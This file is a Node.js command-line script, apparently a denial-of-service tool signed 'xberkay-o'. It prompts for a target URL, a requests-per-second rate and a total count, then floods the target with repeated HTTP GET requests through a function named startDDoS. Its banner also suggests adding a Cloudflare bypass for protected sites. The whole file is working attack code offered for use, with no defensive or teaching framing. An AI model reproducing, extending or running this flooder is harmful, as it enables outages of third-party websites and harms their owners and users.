// -- Coding by xberkay-o -- //
const http = require('http');
const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

let targetUrl = '';
let requestInterval = 0;
let numRequests = 0;

function clearConsole() {
  console.clear();
}

clearConsole()
const asciiArt = `
     |     |            
  _` |  _` |  _ \   __| 
 (   | (   | (   |\__ \ 
\__,_|\__,_|\___/ ____/ 
`;

console.log(asciiArt);

console.log("\x1b[93m[!] If the site has cloudflare protection, you may need to add bypass to the code.")
console.log("")

const getUserInput = () => {
  rl.question('\x1b[36mEnter the target URL: \x1b[0m', (url) => {
    targetUrl = url;

    rl.question('\x1b[36mHow many requests should be sent per second: \x1b[0m', (interval) => {
      requestInterval = parseInt(interval);

      rl.question('\x1b[36mHow many requests in total should be sent: \x1b[0m', (requests) => {
        numRequests = parseInt(requests);

        startDDoS();
        rl.close();
      });
    });
  });
};

const sendHttpRequest = () => {
  const options = {
    hostname: targetUrl,
    port: 80,
    path: '/',
    method: 'GET',
  };

  const req = http.request(options, (res) => {
    console.log('\x1b[32m[+] Completed request\x1b[0m');
  });

  req.on('error', (e) => {
    console.log('\x1b[31m[-] Failed request\x1b[0m');
  });

  req.end();
};

const startDDoS = () => {
  console.log(`Target: ${targetUrl}`);
  console.log(`Per Second ${requestInterval} request`);
  console.log(`Total ${numRequests} request`);

  for (let i = 0; i < numRequests; i++) {
    setTimeout(sendHttpRequest, i * (1000 / requestInterval));
  }
};

getUserInput();
